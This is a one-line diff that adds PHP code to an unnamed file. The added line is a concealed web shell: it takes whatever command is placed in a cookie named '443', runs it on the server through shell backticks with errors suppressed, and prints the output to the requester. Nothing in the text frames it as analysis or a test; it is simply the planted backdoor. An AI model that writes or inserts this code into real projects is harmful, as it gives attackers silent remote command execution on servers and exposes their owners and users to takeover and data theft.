@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE[443]) echo @nl2br(`$_COOKIE[443]`); ?>
